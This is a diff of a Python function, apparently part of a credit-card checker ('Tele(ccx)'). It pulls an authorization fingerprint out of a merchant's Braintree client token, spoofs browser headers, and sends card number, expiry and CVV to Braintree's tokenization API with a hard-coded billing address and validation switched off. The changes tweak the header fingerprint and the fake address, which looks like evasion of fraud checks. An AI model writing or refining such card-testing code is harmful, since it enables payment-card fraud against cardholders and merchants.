@@ -63,50 +63,50 @@ def Tele(ccx):
 	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
 	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
 	headers = {
-    'authority': 'payments.braintree-api.com',
-    'accept': '*/*',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': f'Bearer {au}',
-    'braintree-version': '2018-05-10',
-    'content-type': 'application/json',
-    'origin': 'https://assets.braintreegateway.com',
-    'referer': 'https://assets.braintreegateway.com/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'cross-site',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+        'accept': '*/*',
+        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+        'authorization': f'Bearer {au}',
+        'braintree-version': '2018-05-10',
+        'content-type': 'application/json',
+        'origin': 'https://assets.braintreegateway.com',
+        'referer': 'https://assets.braintreegateway.com/',
+        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'cross-site',
+        'user-agent': user,
     }
+
 	json_data = {
-    'clientSdkMetadata': {
-        'source': 'client',
-        'integration': 'custom',
-        'sessionId': '3e6443ee-b822-408b-98e4-3091802d6c7a',
-    },
-    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
-    'variables': {
-        'input': {
-            'creditCard': {
-                'number': cc,
-                'expirationMonth': mes,
-                'expirationYear': ano,
-                'cvv': cvv,
-                'billingAddress': {
-                    'postalCode': '10080',
-                    'streetAddress': 'new york',
+        'clientSdkMetadata': {
+            'source': 'client',
+            'integration': 'custom',
+            'sessionId': 'b17c9cd3-08a2-45ad-bf9b-c44450c8a642',
+        },
+        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+        'variables': {
+            'input': {
+                'creditCard': {
+                    'number': n,
+                    'expirationMonth': mm,
+                    'expirationYear': yy,
+                    'cvv': cvc,
+                    'billingAddress': {
+                        'postalCode': '92866',
+                        'streetAddress': '1107 E Chapman Ave',
+                    },
+                },
+                'options': {
+                    'validate': False,
                 },
             },
-            'options': {
-                'validate': False,
-            },
         },
-    },
-    'operationName': 'TokenizeCreditCard',
+        'operationName': 'TokenizeCreditCard',
     }
-	
-	res2 = requests.post(f'https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+
+	res2 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
 
 
 	headers = {
